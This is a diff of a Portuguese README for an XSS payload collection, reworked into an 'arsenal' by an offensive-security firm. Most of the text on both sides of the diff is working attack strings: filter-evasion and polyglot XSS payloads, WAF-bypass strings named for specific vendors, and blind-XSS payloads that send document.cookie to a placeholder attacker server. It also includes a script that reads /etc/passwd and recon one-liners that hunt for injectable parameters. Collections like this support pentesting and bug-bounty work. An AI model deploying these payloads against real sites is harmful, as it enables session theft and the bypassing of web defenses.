@@ -1,102 +1,212 @@
-# XSS-scripts
-Vários scripts voltados a exploração da vulnerabilidade XSS
+![XSS-Scripts Cover](xss_cover.png)
 
-OBS > SEMPREEEE ENCONDEEEE O SCRIPT
+# XSS-SCRIPTS v2.0 — Cross-Site Scripting Arsenal
 
-Posivel BYPASS - Trocar o (.) por > %2f
+> **Desenvolvido por [HuntBox](https://huntbox.com.br) — Empresa 100% ofensiva de segurança.**
 
-# XSS-Html
+```
+PAYLOADS. WAF BYPASS. RECON. EXPLORAÇÃO.
+```
 
-// Basic payload
-<script>alert('XSS')</script>
+Coleção organizada de payloads XSS, técnicas de WAF bypass, one-liners de recon e scripts de exploração para pentests de aplicações web e programas de bug bounty.
 
-<scr<script>ipt>alert('XSS')</scr<script>ipt>
-  
+---
+
+## Módulos
+
+| Módulo | Diretório | Descrição |
+|--------|-----------|-----------|
+| **Reflected XSS** | `payloads/reflected.md` | Payloads clássicos de reflexão em parâmetros |
+| **Stored XSS** | `payloads/stored.md` | Persistência via input não sanitizado |
+| **DOM-Based XSS** | `payloads/dom-based.md` | Exploração client-side via DOM manipulation |
+| **Blind XSS** | `payloads/blind.md` | Callback payloads para execução out-of-band |
+| **Polyglot** | `payloads/polyglot.md` | Payloads universais multi-contexto |
+| **WAF Bypass** | `waf-bypass/` | Cloudflare, CloudFront, ModSecurity, Imperva |
+| **Recon** | `recon/` | One-liners para discovery de endpoints vulneráveis |
+| **Tools** | `tools/` | Integração com subfinder, airixss, bhedak, knoxss |
+
+---
+
+## Estrutura
+
+```
+XSS-scripts/
+├── payloads/
+│   ├── reflected.md
+│   ├── stored.md
+│   ├── dom-based.md
+│   ├── blind.md
+│   └── polyglot.md
+├── waf-bypass/
+│   ├── cloudflare.md
+│   ├── cloudfront.md
+│   ├── modsecurity.md
+│   └── imperva.md
+├── recon/
+│   └── one-liners.md
+├── tools/
+│   ├── subfinder-xss.md
+│   ├── airixss.md
+│   ├── bhedak.md
+│   ├── hakrawler.md
+│   └── knoxss.md
+└── techniques/
+    ├── json-bypass.md
+    ├── postmessage.md
+    └── methodology.md
+```
+
+---
+
+## Payloads — Quick Reference
+
+### Reflected XSS
+
+```html
 "><script>alert('XSS')</script>
-  
-"><script>alert(String.fromCharCode(88,83,83))</script>
-  
-<script>\u0061lert('22')</script>
-  
-<script>eval('\x61lert(\'33\')')</script>
-  
-<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
-  
-<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
-
-// Img payload
-<img src=x onerror=alert('XSS');>
-  
-<img src=x onerror=alert('XSS')//
-     
-<img src=x onerror=alert(String.fromCharCode(88,83,83));>
-  
-<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
-  
-<img src=x:alert(alt) onerror=eval(src) alt=xss>
-  
-"><img src=x onerror=alert('XSS');>
-  
-"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
-
-// Svg payload
-  
-<svgonload=alert(1)>
-  
-<svg/onload=alert('XSS')>
-  
-<svg onload=alert(1)//
-     
-<svg/onload=alert(String.fromCharCode(88,83,83))>
-  
-<svg id=alert(1) onload=eval(id)>
-  
 "><svg/onload=alert(String.fromCharCode(88,83,83))>
-  
-"><svg/onload=alert(/XSS/)
-              
-<svg><script href=data:,alert(1) />(test)
-  
-<svg><script>alert('33')
-  
-<svg><script>alert&lpar;'33'&rpar;
-  
-# DomBased XSS
-  // obs: Utilizar a extensão DOM Invader
-  
-123#"><img src=/ onerror=alert(2)>123
-
-# XSS Html 5
-
-<body onload=alert(/XSS/.source)>
-  
-<input autofocus onfocus=alert(1)>
-  
-<select autofocus onfocus=alert(1)>
-  
+<svg onload=alert(1)//
+"><img src=x onerror=alert('XSS');>
 <textarea autofocus onfocus=alert(1)>
-  
-<keygen autofocus onfocus=alert(1)>
-  
-<video/poster/onerror=alert(1)>
-  
-<video><source onerror="javascript:alert(1)">
-  
-<video src=_ onloadstart="alert(1)">
-  
-<details/open/ontoggle="alert`1`">
-  
-<audio src onloadstart=alert(1)>
-  
-<marquee onstart=alert(1)>
-  
-<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>
+<script href=data:,alert(1) />
+```
 
-<body ontouchstart=alert(1)> //
-  
-<body ontouchend=alert(1)>   // 
-  
-<body ontouchmove=alert(1)>  // 
+### Stored XSS
 
+```html
+<a href="javascript:alert(document.cookie)">click me</a>
+<img src=x onerror=alert(document.cookie)>
+```
 
+### DOM-Based XSS
 
+```html
+#"><img src=/ onerror=alert(2)>
+```
+
+### Blind XSS
+
+```html
+"><script src=https://YOUR-SERVER></script>
+<img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://YOUR-SERVER'>
+<details open ontoggle="new Image().src='https://YOUR-SERVER?c='+document.cookie">
+<iframe srcdoc="<script src='https://YOUR-SERVER'></script>">
+<marquee onstart="fetch('https://YOUR-SERVER?d='+document.cookie)">XSS</marquee>
+```
+
+### SSRF via XSS
+
+```html
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){document.write(this.responseText)};
+x.open("GET","file:///etc/passwd");
+x.send();
+</script>
+```
+
+---
+
+## WAF Bypass
+
+| WAF | Payload |
+|-----|---------|
+| **Cloudflare** | `<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ=="))>` |
+| **Cloudflare** | `<svg/oNLY%3d1//On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>` |
+| **CloudFront** | `<details/open/ontoggle=confirm('XSS')>` |
+| **ModSecurity** | `<svg onload='new Function*["Y000!"].find(al\u0065rt)*'>` |
+| **Imperva** | `<details x=xxX... 2 Open ontoggle=k&#x61;alert&#x28;origin)>` |
+
+---
+
+## Polyglot Payloads
+
+```
+JavaScript://%250A/*?'/*\\'/*"/*\\"/*`/*\\`/*%26apos;)/*\<!--></Script/></textArea/>
+</iFrame/></noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/
+(confirm)(1)}//><Base/Href=//YOUR-SERVER-->
+```
+
+```
+'"><Img Src=OnXSS OnError=(confirm)(1)>
+```
+
+```
+'"><!--></Title/</Textarea/</Script/></Iframe><Details/Open/OnToggle=(confirm)(1)-->
+```
+
+---
+
+## Recon One-Liners
+
+```bash
+# Subfinder + Wayback + XSS check
+echo "target.com" | subfinder -silent -nc | waybackurls | \
+egrep -iv '\.(jpg|jpeg|gif|css|png|js|woff|ico|pdf|svg|txt)' | \
+grep -aE '=.*[<>]'
+
+# Blind XSS via GAU
+subfinder -d target.com | gau | bxss \
+  -payload '"><script src=https://YOUR-SERVER></script>' \
+  -header "X-Forwarded-For"
+
+# DOM XSS — var extraction
+assetfinder target.com | gau | \
+egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif)' | while read url; do
+  vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed 's/var //g')
+  echo -e "$url\n$vars"
+done
+```
+
+---
+
+## Metodologia
+
+```
+1. Verificar reflexão → target.com/search?q=teststring
+2. Testar balanceamento → ?q=teststring'">
+3. Se < > encodados → próximo endpoint
+4. Se NÃO encodados → testar payloads + bypass
+5. Identificar WAF → usar bypass específico
+6. Escalar: Reflected → Stored → Blind
+```
+
+---
+
+## Severity Reference
+
+| Tipo de XSS | Severity |
+|-------------|----------|
+| Stored XSS com execução automática | CRITICAL |
+| Blind XSS com exfiltração de cookies/sessions | CRITICAL |
+| Reflected XSS sem interação | HIGH |
+| DOM-Based XSS | HIGH |
+| Self-XSS (requer social engineering) | LOW |
+
+---
+
+## Tools Integradas
+
+| Ferramenta | Uso |
+|-----------|-----|
+| **Subfinder** | Subdomain enumeration → pipeline XSS |
+| **Airixss** | Scan automatizado de reflected XSS |
+| **Bhedak** | Fuzzing de parâmetros para XSS |
+| **Hakrawler** | Crawl + discovery de endpoints |
+| **KNOXSS** | Validação online de XSS |
+| **xss-payloads-generator** | Geração automatizada de payloads |
+
+---
+
+## Aviso Legal
+
+Use somente em **engagements autorizados**. O uso em sistemas sem autorização é ilegal.
+
+---
+
+<div align="center">
+
+**Desenvolvido por [HuntBox](https://huntbox.com.br)**
+*Empresa 100% ofensiva — Pentest • Red Team • Bug Bounty*
+
+</div>
